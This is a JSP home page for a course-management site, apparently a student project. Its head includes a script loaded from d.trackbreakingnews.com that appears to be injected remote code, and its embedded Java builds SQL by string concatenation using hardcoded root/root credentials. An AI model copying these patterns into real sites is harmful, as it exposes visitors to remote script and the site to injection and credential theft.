<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
     <%@ page import="java.sql.*" %>
     
     <%@ page import= "java.io.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">


  <head>
  	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Home</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
     <style type="text/css">
  .NM {
  top:-45px;
  position: relative;
  left:45px;
  }
    .NM1 {
  top:-35px;
  position: relative;
  left:55px;
   text-decoration: none;
  }
  .NM1{
  font-size: 18px;
  color: #000;
  text-decoration: none;
  font-family: Lato;
  }
  .NM1:hover{
  font-size: 18px;
  color: #000;
  text-decoration: none;
  font-family: Lato;
  }
  .DP {
  width: 210px;
  text-decoration: none;
  height:8px;
  }
  </style>
 
  </head>
  <body>
				
                  	<div class="navbar navbar-inverse navbar-fixed-top pulse animated">
					<div class="container">
						<a class="navbar-brand XX" href="Data1.jsp">
							<img src="iWall/logo1.png"><p>CMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
					
						 <%
						 session=request.getSession();
                   		String ssx1=(String) session.getAttribute("xuser1");
                   		String ssx2=(String) session.getAttribute("xuser2");
                   		String ssx3=(String) session.getAttribute("xadmin");
						if(ssx1==null && ssx2==null&& ssx3==null){
                     %>
                    
                     <li> <a href="Owner1.jsp">Owner</a></li>
                       <li> <a href="Login1.jsp">Login</a></li>
					<%}%>
					
					<%
					if(ssx1==null && ssx3!=null && ssx2==null){%>
						
									<%
				Connection conn9xix=null;
				PreparedStatement ps9xix=null;
				ResultSet rs9xix=null;
				OutputStream oImagexix;
				String gg=(String) session.getAttribute("xad");
				
	try
	{
		Class.forName("com.mysql.jdbc.Driver");
		conn9xix=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
		String query9xix="Select * From admin1 where mail='"+gg+"'";
		ps9xix=conn9xix.prepareStatement(query9xix);
		rs9xix=ps9xix.executeQuery();
	
		%>
	
		<% if(rs9xix.next())
		{%>
	
		<tr style="border-bottom-style:solid;">
		<td>
		<a href="Owner1.jsp"><input type="image" src="imgx.jsp?imgid=<%=rs9xix.getInt(1)%>" class="fadeInDown animated img-circle" width="45" height="45"></a>
		
		<li class="NM"></li></td>
		</tr>
					 <li  class="active"> <a href="Home2.jsp">Home</a></li>
					<li > <a href="Course.jsp">Course</a></li>
					<li class="dropdown ">
						<a href="Owner1.jsp" data-toggle="dropdown" class="dropdown-toggle"><%=ssx3 %> <span class="caret"></span></a>
						<ul class="dropdown-menu ">
						<tr style="border-bottom-style:solid;"><td>
						<a href="Owner1.jsp"><input type="image" src="imgx.jsp?imgid=<%=rs9xix.getInt(1)%>" class="fadeInDown animated img-circle" width="45" height="45"></a>
						<div class="DP">
						<li class="NM1"> <a href="Owner1.jsp"><%=ssx3%></a> </li></div>
						<li class="divider"></li>
						<%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						%>
						<li><a href="Forgot1.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
						<li> <a href="Logout.jsp">Logout</a> </li>
						<%conn9xix.close();%>
						<%}%>
						<% }catch(Exception e)
						{
						out.println(e);
						}%><%} %>
					
		
					<%
					if(ssx1==null && ssx3==null && ssx2!=null){%>
					<%
					Connection conn9xx=null;
					PreparedStatement ps9xx=null;
					ResultSet rs9xx=null;
					OutputStream oImagexx;
					
					String x=(String) session.getAttribute("xu2");
					
					try
					{
						Class.forName("com.mysql.jdbc.Driver");
						conn9xx=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String query9xx="Select * From admin1 where mail='"+x+"'";
						ps9xx=conn9xx.prepareStatement(query9xx);
					
						rs9xx=ps9xx.executeQuery();
						%>
						<%if(rs9xx.next())
						{
						
						
						%>
						
						<tr style="border-bottom-style:solid;"><td>
						<a href="Owner.jsp"><input type="image" src="imgx.jsp?imgid=<%=rs9xx.getInt(1)%>" class="fadeInDown animated img-circle" width="45" height="45"></a>
						<li class="NM"></li></td>
						</tr> <li  class="active"> <a href="Home2.jsp">Home</a></li>
					<li > <a href="Course.jsp">Course</a></li>
						<li class="dropdown ">
						<a href="Owner.jsp" data-toggle="dropdown" class="dropdown-toggle"><%=ssx2 %> <span class="caret"></span></a>
						<ul class="dropdown-menu ">
						<tr style="border-bottom-style:solid;"><td>
						<a href="Owner.jsp"><input type="image" src="imgx.jsp?imgid=<%=rs9xx.getInt(1)%>" class="fadeInDown animated img-circle" width="45" height="45"></a>
						<div class="DP">
						<li class="NM1"> <a href="Owner.jsp"><%=ssx2 %></a> </li></div>
						<li class="divider"></li>
						<%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
						<li><a href="Forgot1.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
					
						<li> <a href="Lout.jsp">Logout</a> </li>
						
						<%conn9xx.close();%>
		

		<%}%>

	<% }catch(Exception e)
	{
		out.println(e);
		
	}%><%} %>
						
						
									<%if(ssx1!=null && ssx3==null && ssx2==null){%>
						
									<%
				Connection conn9xxx=null;
				PreparedStatement ps9xxx=null;
				ResultSet rs9xxx=null;
				OutputStream oImagexxx;
				
	try
	{
		Class.forName("com.mysql.jdbc.Driver");
		conn9xxx=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
		String query9xxx="Select * From admin1";
		ps9xxx=conn9xxx.prepareStatement(query9xxx);
		rs9xxx=ps9xxx.executeQuery();
	
		%>
	
		<% if(rs9xxx.next())
		{%>
		<% int g=rs9xxx.getInt(9);
		
		%>
		<tr style="border-bottom-style:solid;">
		<td>
		<a href="Owner2.jsp"><input type="image" src="imgxx.jsp?imgid=<%=g+1%>" class="fadeInDown animated img-circle" width="45" height="45"></a>
		
		<li class="NM"></li></td>
		</tr> <li  class="active"> <a href="Home2.jsp">Home</a></li>
					<li > <a href="Course.jsp">Course</a></li>
					<li class="dropdown ">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle"><%=ssx1 %> <span class="caret"></span></a>
						<ul class="dropdown-menu ">
							<tr style="border-bottom-style:solid;">
		<td>
		
		<a href="Owner2.jsp"><input type="image" src="imgxx.jsp?imgid=<%=g+1%>" class="fadeInDown animated img-circle" width="45" height="45"></a>
		
						<div class="DP">
						<li class="NM1"> <a href="Owner2.jsp"><%=ssx1 %></a> </li></div>
						<li class="divider"></li>
						<%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg1";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
						<li><a href="Forgot1.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
					
						<li> <a href="Lout.jsp">Logout</a> </li>
							<%conn9xxx.close();%>
		

		<%}%>

	<% }catch(Exception e)
	{
		out.println(e);
		
	}%><%} %>
						
						
						
					
					</li>
							</ul>
	          </div> 
	      </div>
	  </div>

  		<div class="row"> 
  			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
  			
  				<div id="MmyCarousel" class="carousel slide" data-ride="carousel">
  <!-- Indicators -->
  <ol class="carousel-indicators">
    <li data-target="#MmyCarousel" data-slide-to="0" class="active"></li>
    <li data-target="#MmyCarousel" data-slide-to="1"></li>
    <li data-target="#MmyCarousel" data-slide-to="2"></li>
  </ol>

  <!-- Wrapper for slides -->
  <div class="carousel-inner">
    <div class="item active">
      <img src="iWall/img-cshp-photo.jpg" alt="img-cshp-photo" class="img-responsive">
      <div class="carousel-caption TXT">
      	
		<h3 class="fadeInUp animated">Create Courses, Modules, Units, Quizzes, Questions </h3> <br/>
			<p class="fadeInDown animated">Set Timers, Auto Or Manually Evaluate Quizzes</p><br/>
			<h4 class="fadeInUp animated">Check Results, Notifications , Messages</h4><br/>
			<h5 class="fadeInUp animated">Set Badges, Certificates for Courses</h5><br/>
			<h2 class="fadeInDown animated">Sell course as Single, Group and Subscription</h2><br/>

			      </div>
			    </div>
			    <div class="item Imgg">
			      <img src="iWall/Aerial_view_of_graphic_era_university.jpg" alt="Aerial_view_of_graphic_era_university" class="img-responsive">
			      <div class="carousel-caption TXT1">
						<h3>LEARNING MANAGEMENT SYSTEM <br/>
						<h4>For WordPress</h4>
						<h5>Create your own Courses and sell online.</h5>
						<h2>It IS Not just a WordPress Theme.</h2>
			      </div>
			    </div>
			    <div class="item" >
			      <img src="iWall/11.jpg" alt="11" class="img-responsive">
			      <div class="carousel-caption TXT">
					<h3 class="fadeInUp animated">LEARNING MANAGEMENT SYSTEM</h3>
						      	<h4>Create your own Courses and sell online. </h4>
						      		<h5>It IS Not just a WordPress Theme.</h5>
			      </div>
			    </div>
			  <!-- Controls -->
			  <a class="left carousel-control" href="#MmyCarousel" role="button" data-slide="prev">
			    <span class="icon-prev" aria-hidden="true"></span>
			    <span class="sr-only">Previous</span>
			  </a>
			  <a class="right carousel-control" href="#MmyCarousel" role="button" data-slide="next">
			    <span class="icon-next" aria-hidden="true"></span>
			    <span class="sr-only">Next</span>
			  </a>
			</div>
			</div>
			</div>
			<div class="container">
				<div class="row CNT">
					<div class="col-lg-3 col-md-3 col-sm-3  col-xs-6 IMX">
					<img src="iWall/4.png" alt="4"><br/>
					<strong><h4>ONLINE COURSES</h4>
						<small>COURSE MANAGEMENT</small>
						<h6><em>It is a long established fact that a reader will be distracted.</em></h6>
					</strong> 
					<a href="#">More</a>
					</div>
				
				<div class="col-lg-3 col-md-3 col-sm-3  col-xs-6 ">
					<img src="iWall/3.png" alt="3"><br/>
					<strong><h4>MULTIMEDIA UNITS</h4>
					<small>AUDIO, VIDEO PLAYBACK</small>
					<h6><em>It is a long established fact that a reader will be distracted</em></h6>
					</strong>
					<a href="#">More</a>
					</div>
				<div class="col-lg-3 col-md-3 col-sm-3  col-xs-6">
					<img src="iWall/2.png" alt="2"><br/>
					<strong><h4>SUBSCRIBE COURSES</h4>
					<small>SELL COURSES</small>
					<h6><em>It is a long established fact that a reader will be distracted</em></h6>
					</strong>
					<a href="#">More</a>
					</div>
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
					<img src="iWall/1.png" alt="1"><br/>
						
						<strong><h4>BECOME AN INSTRUCTOR</h4>
						<small>TEACH ONLINE</small>
						<h6><em>It is a long established fact that a reader will be distracted
						more</em></h6>
						</strong>	
						<a href="#">More</a>
					</div>
				</div>
			</div><br/><br/><br/><br/><br/><br/><br/>
			
			<div class="container">
				<div class="row CNT2">
					<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
					<img src="iWall/banner1.jpg" alt="banner1" class="img-thumbnail">
					</div>
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
					<img src="iWall/banner2.jpg" alt="banner2" class="img-thumbnail">
					</div>
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6 ">
					<img src="iWall/banner4.jpg" alt="banner4" class="img-thumbnail">
					</div>

				<div class="col-lg-3 col-md-3 col-sm-3  col-xs-6">
					<img src="iWall/banner03.jpg" alt="banner4" class="img-thumbnail">
					</div>
				</div>
			</div>
			<br/>
			<hr>
		<div class="container ZZ1">
			<strong>POPULAR COURSES</strong> <br/> <br/>
			<div class="row GX">
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6 ">
						<div class="thumbnail">
							<img src="iWall/fac-img1.jpg" alt="fac-img2" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Engineering and Technology</strong><hr>
							<p>
								Those candidates desiring to pursue further studies are doing immensely well in both India and abroad. In India, our students are present in large numbers in major industrial houses in India and abroad. Each year, a large number of our students also qualify the GATE exam with high percentile.
							</p> <br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>

					<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
						<div class="thumbnail">
							<img src="iWall/fac-img2.jpg" alt="fac-img2" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">School of Management Studies</strong> <hr>
								<p>
									Faculty of Management Studies MBA program model combines a traditional but highly focused curriculum with a  workshops small-group learning experiences that are action-oriented. We expect our students to immerse themselves wholly in the program during its 2 years.
								</p>
								<br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
					</div>
				</div>

				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
					<div class="thumbnail">
						<img src="iWall/fac-img3.jpg" alt="fac-img3" class="img-responsive img-thumbnail">
						<div class="caption">
							<strong class="lead">School of Computer Application</strong> <hr>
							<p>GEU School of Computer Application offers specialized courses in
								Computer Science, Computer Application Information Technology and High Performance
								Computing.The faculty members devote time in teaching applied sciences in different branches of Engineering and Computers.
								</p>
								<br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
					</div>
				</div>
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
					<div class="thumbnail">
						<img src="iWall/fac-img4.jpg" alt="fac-img4" class="img-responsive img-thumbnail">
						<div class="caption">
							<strong class="lead">
							School of Allied Sciences 
							</strong><hr/>
						<p>
							Computer Application Excellence in studies of Applied Sciences has always been the hall mark of Graphic Era University with faculty members of proven excellence and outstanding experience. We have state of the art laboratories enriched with latest research facilities . 						</p><br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
					</div>
				</div>
			</div>
		</div>
			<br/><br/><hr>


		<div class="container-fluid CNTT">
			<h2>ACADEMIC FACILITIES</h2> <br/><br/> 
		<div class="container  fadeIn animated">
			<div class="row GX">
				<div class="col-lg-9 col-md-9 col-sm-9 col-xs-9 Pp">
							<img src="iWall/class-room.jpg" alt="class-room" class="img-responsive img-thumbnail pull-left">
							<div class="caption">
							<strong>Classrooms</strong><br/> <br/> 
							<p>
							Set in the ambience of tranquility, the state of the art Classrooms and the Lecture Theatres are equipped with <em>LCD Projectors, Networked Computers</em>,<strong>Intelligent whiteboards and above all adept teachers<small> make the classroom</small> </strong> experience highly educational.The designs and concept of the rooms have ensured natural sound proofing and clear visibility for all.

							</p> <br/> <br/>
								
							</div><hr>
						</div>
						<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3">
							<img src="iWall/2s.jpg" alt="2s" class="img-responsive img-thumbnail pull-left">
						</div>
			</div>
				

				<div class="row GX">
				<div class="col-lg-9 col-md-9 col-sm-9 col-xs-9  Pp">
							<img src="iWall/library-1.jpg" alt="library-1" class="img-responsive img-thumbnail pull-left">
							<div class="caption">
								<strong>Library</strong><br/>
									<p class="lead">
									The nerve centre of any <strong>educational institute is its library where the books / journals that the institution makes available to its students are stored.</strong> <em> The institute has up to date central library </em>housed in a separate newly extended building with a total area of about 20000 sq.ft. The sitting capacity is about 300.

									GRAPHIC ERA UNIVERSITY central library has a number of technical books, periodicals, video films, magazines and other national & International publication.
									</p></div><br/><hr>
								</div>
				
							<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 ">
							<img src="iWall/3.jpg" alt="3" class="img-responsive img-thumbnail pull-left">
							</div>
							</div>

							<br/>

				<div class="row GX">
				<div class="col-lg-9 col-md-9 col-sm-9 col-xs-9  Pp">
							<img src="iWall/library-2.jpg" alt="library-2" class="img-responsive img-thumbnail pull-left">
							<div class="caption">
								<strong>GEU has some of the most diverse Sections of Library:</strong><br/> <br/> 
							<p>
								1: Lending section<br/>
								2: Reference section<br/>
								3: Text Book section<br/>
								4: Book<em> Bank section<br/></em>
								5: Reading Room section.
							</p>
								
							</div> <br/><hr>
						</div>
				
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 ">
							<img src="iWall/4.jpg" alt="4" class="img-responsive img-thumbnail pull-left">
					
				</div>
				</div>




				<div class="row GX">
				<div class="col-lg-9 col-md-9 col-sm-9  col-xs-9 Pp"><br/>
					
							<img src="iWall/acdmc-facilities-img7.jpg" alt="acdmc-facilities-img7" class="img-responsive img-thumbnail pull-left">
							<div class="caption">
								<strong>Internet Facility</strong><br/> 
							<p>
							Since it has been proved that the entire world is like a global village and now no part of the world is left unearthed, therefore, in this era of globalization stabilized link plays an important role.<strong>GRAPHIC ERA UNIVERSITY  </strong> has placed a VSAT, facilitating uninterrupted connectivity at the constant speed of<strong> 2Mbps round the clock</strong>. Optical fiber back bone with structural cabling provides<em> internet connectivity between </em>and to all the computers with faculty, students & faculty residences.

							</p> 
								
							</div><br/><hr>
						</div>
						<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 ">
							<img src="iWall/intro_img9.jpg" alt="intro_img9" class="img-responsive img-thumbnail pull-left">
					
				</div>
						
				</div>
			

				<div class="row GX">
				<div class="col-lg-9 col-md-9 col-sm-9 col-xs-9 Pp"><br/>
					
							<img src="iWall/acdmc-facilities-img3.jpg" alt="acdmc-facilities-img3" class="img-responsive img-thumbnail pull-left">
							<div class="caption">
								<strong>Conference Halls</strong><br/> <br/> 
							<p>
							It serves as the perfect focal point of numerous academic events with central air conditioning, ultra modern sound system, video projection facility, hi - tech lighting and provision for special light effects.<strong>It also serves as a suitable venue for peer and industry interaction through talk shows, seminars etc.</strong> 

							</div><br/> <br/> <br/><hr>
						</div>
						<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 ">
							<img src="iWall/intro_img3.jpg" alt="intro_img3" class="img-responsive img-thumbnail pull-left">
					
				</div>
				</div>

				<div class="row GX">
				<div class="col-lg-9 col-md-9 col-sm-9 col-xs-9 Pp">
					
							<img src="iWall/computer-lab.jpg" alt="computer-lab" class="img-responsive img-thumbnail pull-left">
							<div class="caption">
								<strong>Computer Centre</strong><br/> <br/> 
							<p>The objective of GRAPHIC ERA UNIVERSITY has always been to be in the forefront of utilization of IT. Leveraging its power in making learning informative & entertaining for the students. The state-of-the art technology in our computer centre comprises the following:<br/><br/>

								   <strong>  Dual processor<em>IBM XEON server</em>with windows 2000 platform.<br/>
								    Dual processor <em>IBM XEON</em> server with SCO-UNIX Operating System with SDK kit.<br/>
								    Dual processor <em>HP XEON</em> server with Linux Operating System.<br/><br/></strong> 


								To facilitate hard copy printing, network printers in the form of Dot Matrix, laser and line matrix printers have been installed. A fast and efficient switch based network with Gigabit/Sec speed of server forms an intranet, connecting different buildings of the campus.<br/><br/>

								The software available at computer centers are <strong><em>Visual Studio, JDK, Turbo C++, MS-SQL 2000, Auto-CAD, Mechanical Desktop, 3D Studio, Auto Architect, Office 2000, Or CAD & Tally.</em></strong>
							</p> <br/>
								
							</div>
						</div>
						<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 ">
							<img src="iWall/xxxx.jpg" alt="xxxx" class="img-responsive img-thumbnail pull-left">
							
							</div>
						</div>
					</div>
				</div>
			<hr>
	</div>
	
		<div class="container ZZ1">
			<strong>MORE COURSES</strong><br/><br/> 
			<div class="row">
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 ">
					<div class="thumbnail">
					<img src="iWall/softwaretraining1.jpg" alt="softwaretraining1" class="img-responsive img-thumbnail">
					<div class="caption">
							<h4 class="lead">Software Training</h4> <hr>
							<span class="Glyphicon Glyphicon-star" >
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star-empty"></span>
								<span class="Glyphicon Glyphicon-star-empty"></span>
								<span class="Glyphicon Glyphicon-star-empty"></span>
								Free</span><hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>
						</div>
					</div>
				</div>
				
			<div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
					<div class="thumbnail">
					<img src="iWall/writing1.jpg" alt="writing1" class="img-responsive  img-thumbnail">
						<div class="caption">
							<h4 class="lead">How to write effectively</h4> <hr>
								<span class="Glyphicon Glyphicon-star" >
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star-empty"></span>Free</span>
								<hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>
						</div>
					</div>
				</div>

				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 ">
					<div class="thumbnail">
					<img src="iWall/photography31.jpg" alt="photography31" class="img-responsive img-thumbnail">
						<div class="caption">
							<h4 class="lead">Nature Photography</h4><hr>
							<span class="Glyphicon Glyphicon-star" >
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star-empty"></span>
								Free</span>
								<hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>
							</div>
						</div>
					</div>

				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 ">
					<div class="thumbnail">
					<img src="iWall/mobileapps1.jpg" alt="mobileapps1" class="img-responsive img-thumbnail">
						<div class="caption">
							<h4 class="lead">Developing Mobile Apps</h4> <hr>
							<span class="Glyphicon Glyphicon-star" >
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star"></span>
								<span class="Glyphicon Glyphicon-star-empty"></span>
								Free</span>
								<hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>

							</div>
						</div>
					</div>
				</div>
			</div> <br/> <hr>

<div class="container ZZ2">
			<strong>OUR COURSES</strong> <br/> <br/>
			<div class="row GX">
				<div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
						<div class="thumbnail">
							<img src="iWall/intro_img5.jpg" alt="intro_img5" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Under Graduate Programs</strong><hr>
							<p>
							<a href="#"> <h3>$ 60<small>Per One Month </small></h3></a>
							</p> 
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>
				<div class="col-lg-4 col-md-4 col-sm-4 col-xs-12 ">
						<div class="thumbnail">
							<img src="iWall/intro_img4.jpg" alt="intro_img4" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Post Graduate Programs</strong><hr>
							<p>
								<a href="#"> <h3>$ 80<small>Per One Month </small></h3></a>
							</p> 
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>
				<div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
						<div class="thumbnail">
							<img src="iWall/intro_img3.jpg" alt="intro_img3" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Graduate Programs</strong><hr>
							<p>
								<a href="#"> <h3>$ 50<small>Per One Month </small></h3></a>
							</p> 
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>
				</div>
				</div><br/>
		

		<div class="container-fluid CNTXX">
  			<div class="row">		
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12  CNTXX1">
  					<strong class="lead">We've got what you need! </strong>
  						<h5 class="lead">Still Have Questions?</h5>
  					<small> Contact Us</small> <p> Share Us</p><br/><br/>		
  					<div class="CCC">			
  					 <button type="button" class="btn btn-default" data-toggle="modal" data-target="#myModal">
             		Message
			</button>
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
	  <div class="modal-dialog">
    	<div class="modal-content">
      		<div class="modal-header">Message
        		<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        		<h4 class="modal-title lead" id="myModalLabel">Message</h4>
      		</div>
      		<div class="modal-body">
        			
							<form class="form-inline XL" method="post" action="Msg.jsp">
                        	<input type="text" class="form-control" name="nmm" placeholder="Enter Name" required autofocus> 
                        	<input type="text" class="form-control" name="nmm1" placeholder="Enter Last Name" required autofocus><br/><br/>
                        	<input type="email" class="form-control" name="nmm2" placeholder="Enter Email" required autofocus> 
                        	<input type="text" class="form-control" name="nmm3" placeholder="Enter Phone" required autofocus><br/><br/>
                        	<textarea rows="3" cols="50%" name="nmm4" placehodler="Write Message">
                        	</textarea><br/><br/>
                        	<button type="submit" class="btn btn-default btn-lg pull-left"> Send</button><br/><br/><br/>
                    </div>    	
    			</div>
    		</div>
  		</div>
	</div>
  					
  					<a href="www.insstagram.com"><img src="iWall/instagram.png" alt="instagram"></a>
  					<a href="#"><img src="iWall/twitter.png" alt="twitter"></a>
  					<a href="www.facebook.com/ajaysinghbisht002"><img src="iWall/facebook.png" alt="facebook"></a>
  					<a href="#"><img src="iWall/google_plus.png" alt="google-plus"></a>
  					<a href="#"><img src="iWall/you-tube.png" alt="you-tube"></a>
  					<a href="#"><img src="iWall/skype.png" alt="skype"></a>

		  	</div></div>
		  	<hr>
		  	<div class="row">
		  		<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 ">
		  		<form action="Sub.jsp" method="post">
		  			<h4 class="lead">Subscribe to our Newsletter for latest news.</h4>
		  			<div class="form-inline  FCC">
		  			<input type="email" class="form-control" name="nmz" placeholder="Enter Email"> 
		  		<button type="submit" class="btn btn-default">Subscribe </button></div>
		  		</div></form>
		  	</div>
		  	<div class="row">
		  		<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6 ">
					<h2 class="lead"><span class=" glyphicon glyphicon-cloud"></span> Browse</h2>
					   <h6>  Prices<br/>
					    Courses<br/>
					    Blog<br/>
					    Contacts</h6>
		  		</div>
		  		<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6 ">

					<h2 class="lead"><span class="glyphicon glyphicon-save-file"></span>  About Learn</h2>
					  <h6> About Us<br/>
					    Apply<br/>
					    Terms and conditions<br/>
					    Register</h6>

		  		</div>


		  		<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6 ">		  		
					<h2 class="lead"><span class="glyphicon glyphicon-open-file"></span>  Next Courses</h2>
					  <h6> Biology<br/>
					    Management<br/>
					    History<br/>
					    Litterature</h6>
				</div>


		  		<div class="col-lg-3 col-md-3 col-sm-3 col-xs-6 ">
		  			<h2 class="lead"> <span class="glyphicon glyphicon-earphone"></span>  Contact Us</h2>
					    <h6> 
					    Whats app:(+91) 9897989732<br/>
					    Instagram: thespartan002<br/>
					    facebook: fb/ajaysinghbisht002<br/>
					    Twitter: @002ajay</h6>

		  		</div>
		  	</div><hr/></div>
		  	<div class="container-fluid CNTXX3">
		  			<div class="row">
		  				<div class="col-lg-12 col-md-12 col-sm-12  col-xs-12">
						<img src="iWall/Map.png" alt="Map" class="mg-responsive img-thumbnail">
						</div>	
						</div>
					</div>
				<div class="Cvv">
						<div class="container-fluid FFF">
							<div class="row">
						<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay (</em>Twitter</em>)</small>
							</h5>
						</div>
					</div>
				</div>


			  <script src="jquery.min.js"></script>
			    <script src="js/bootstrap.min.js"></script>
			    <script src="js/docs.min.js"></script>
			    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
			    <script src="js/ie10-viewport-bug-workaround.js"></script>
			    <script>
				$('.dropdown').hover(function() {
					$('.dropdown-toggle',this).trigger('click');
				});
				</script>
			  </body>
			</html>
